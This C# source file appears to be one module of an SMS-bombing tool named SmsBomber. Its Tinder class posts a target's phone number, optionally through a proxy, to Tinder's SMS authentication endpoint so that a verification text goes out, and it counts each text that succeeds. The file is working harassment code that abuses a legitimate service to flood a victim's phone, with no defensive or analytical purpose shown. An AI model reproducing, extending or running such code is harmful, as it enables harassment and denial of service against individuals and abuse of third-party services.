using Leaf.xNet;
using static SmsBomber.ReturnTypes;

namespace SmsBomber.SmsService.Sites
{
    internal class Tinder
    {
        public static ResponseSendSms SendSms()
        {
            using (var request = new HttpRequest())
            {
                if (!string.IsNullOrWhiteSpace(Globals.WorkingData.ProxyAdress)) { request.Proxy = ProxyClient.Parse(Globals.WorkingData.ProxyTypeLeaf, Globals.WorkingData.ProxyAdress); }
                string response = "";
                try
                {
                    response = request.Post($"{DomainList.Tinder}/v2/auth/sms/send?auth_type=sms&locale=ru", $"{{\"phone_number\":\"{Globals.WorkingData.PhoneNumber}\"}}", "application/json").ToString();
                }
                catch
                {
                    return new ResponseSendSms { FailedConnected = !request.HttpIsConnected(), SuccessSend = false };
                }


                if (request.Response.ToString().Contains("\"sms_sent\":true}"))
                {
                    Globals.WorkingStats.CountSendingSms++;
                    return new ResponseSendSms { SuccessSend = true };
                }
                return new ResponseSendSms { SuccessSend = false };
            }
        }
    }
}
